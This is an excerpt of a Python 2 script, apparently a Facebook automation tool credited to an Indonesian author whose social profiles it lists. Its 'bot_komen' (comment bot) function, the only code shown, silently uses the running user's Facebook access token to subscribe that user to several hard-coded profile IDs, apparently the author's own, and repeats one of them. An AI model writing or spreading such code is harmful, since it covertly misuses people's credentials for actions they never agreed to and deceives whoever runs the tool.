#!/usr/bin/python2
# coding=utf-8
# coded by Alif Febriyan
# fb.me/gaaaarzxd
# instagram.com/Lordz.Alif
# open source, tidak di perjual belikan
# RECORDER MR.ALIF
# fb.me/Aliff.febriyan
# youtube AlifTricker
...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100039791984160/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001913817263/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045047953420/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045047953420/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045047953420/subscribers?access_token=' + token)
